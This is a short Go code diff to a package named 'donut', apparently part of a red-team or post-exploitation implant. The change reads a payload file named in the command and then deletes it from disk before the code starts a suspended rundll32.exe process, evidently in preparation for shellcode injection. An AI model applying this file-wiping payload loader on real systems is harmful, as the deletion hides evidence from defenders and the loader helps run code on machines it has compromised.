@@ -4,6 +4,8 @@ package donut
 
 import (
 	"fmt"
+	"os"
+	"strings"
 	"io/ioutil"
 	"runtime"
 
@@ -26,7 +28,10 @@ func init() {
 const COMMANDLINE string = "rundll32.exe"
 
 func (d *Donut) Run(command string, timeout int) ([]byte, string, string) {
-	bytes, _ := ioutil.ReadFile(command)
+    // Read payload file, delete
+    payload := strings.Fields(command)[0]
+	bytes, _ := ioutil.ReadFile(payload)
+    os.Remove(payload)
 
 	handle, pid, stdout, stderr := CreateSuspendedProcessWithIORedirect(COMMANDLINE)
 
